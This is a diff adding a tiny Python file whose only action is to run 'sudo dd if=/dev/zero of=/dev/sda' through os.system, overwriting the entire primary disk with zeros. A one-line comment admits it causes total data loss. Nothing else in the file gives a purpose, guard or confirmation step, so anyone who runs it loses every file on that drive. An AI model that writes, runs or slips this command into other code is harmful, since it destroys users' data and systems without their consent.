@@ -1,0 +1,4 @@
+import os
+
+# WARNING: This is highly dangerous and can result in total data loss
+os.system("sudo dd if=/dev/zero of=/dev/sda bs=1M status=progress")
